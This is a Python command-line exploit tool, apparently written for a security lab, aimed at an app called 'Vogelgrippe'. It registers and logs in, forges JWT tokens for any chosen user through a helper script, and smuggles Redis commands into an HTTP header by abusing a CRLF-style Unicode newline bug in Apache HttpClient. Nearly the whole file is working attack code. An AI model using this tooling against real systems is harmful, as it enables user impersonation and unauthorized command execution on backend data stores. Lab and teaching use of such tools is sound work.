import pickle

import click
import requests
import subprocess
import base64


@click.group()
def cli():
    pass


@cli.command()
@click.option('--redis-host',
              default='localhost:6379',
              help='Redis hostname/ip')
@click.option('--target',
              prompt='Vogelgrippe target',
              default='localhost:3000',
              help='The host and port where Vogelgrippe frontend runs (depending on your exploit choice)')
@click.argument('payload_file')
def redis(redis_host, target, payload_file):
    """Tries to send a query to the running redis instance through header injection."""
    click.echo('Exploiting redis (running on %s) through Vogelgrippe (running on %s) ' % (redis_host, target))
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return

    raw_payload = open(payload_file, "r").read()

    click.echo('Sending following redis commands (from %s):\n%s' % (payload_file, raw_payload))

    payload = prepare_injected_payload(raw_payload)
    frontend_payload = {'header': payload.encode("utf-8"), 'urlmessage': "http://" + redis_host}

    click.echo('Sending payload:')
    click.echo('---------START-OF-PAYLOAD---------\n%s' % payload)
    click.echo('----------END-OF-PAYLOAD----------')

    r = session.post(f'http://{target}/post', data=frontend_payload, allow_redirects=False)

    click.echo('Request returned status code %s.' % str(r.status_code))
    if r.status_code == 302:
        click.secho('Exploit successfully executed.', fg="green")
    else:
        click.echo(r.text)
        click.secho('Exploit failed. Response above.', fg="red", err=True)

@cli.command()
@click.argument('usertag')
def fake_user(usertag):
    """Forges a certain user's jwt-token and prints it to the command-line. Provide the usertag which is 'username:userid'"""
    session = requests.session()
    if not logged_in(session):
        click.echo("Not logged in. Run login command first.")
        return
    else:
        jwt_token = session.cookies.get('jwt')
        new_payload = '{"username": "'+usertag.split(':')[0]+'", "userid": '+usertag.split(':')[1]+'}'
        forged_jwt_token = subprocess.check_output(["node", "./jwt_payloads/jwt_exploit_script.js", jwt_token, base64.b64encode(new_payload.encode('ascii'))])

        click.echo("Fake user JWT-token: "+forged_jwt_token.decode("ascii"))
        session.cookies['jwt'] = forged_jwt_token.decode("ascii")

@cli.command()
@click.argument('username')
@click.option('--target',
              prompt='Vogelgrippe frontend',
              default='localhost:3000',
              help='The host and port where Vogelgrippe frontend runs')
def login(username, target):
    """Logs the user in with the specified username. If it doesn't exist it will register it and then login."""
    click.echo('Logging in with %s ' % username)
    session = requests.session()

    user_data = {'username': username}
    r = session.post(f'http://{target}/register', data=user_data)
    click.echo('Register returned status code %s.' % str(r.status_code))
    response = session.post(f'http://{target}/login',
                            data=user_data,
                            allow_redirects=False)

    click.echo('Login returned response code:\n %s.' % response.status_code)
    click.echo('Saving session cookies: %s' % session.cookies.get_dict())
    with open('cookies.dump', 'wb') as f:
        pickle.dump(session.cookies, f)


def prepare_injected_payload(payload: str):
    """Prepares redis payloads to be send via HTTP header injection in Apache HTTPClient"""
    newline = "\u560d\u560a"  # see https://issues.apache.org/jira/browse/HTTPCLIENT-1974
    header_value = '1' + newline  # 1 is the value of the header we control and then we inject a newline
    payload = payload.replace('\n', newline)  # prepare redis payload

    return header_value + payload


def logged_in(session):
    try:
        with open('cookies.dump', 'rb') as f:
            session.cookies.update(pickle.load(f))
            if session.cookies.get('jwt'):
                click.echo("Logged in as: (jwt) %s" % session.cookies.get('jwt'))
                return True
            return False
    except:
        return False
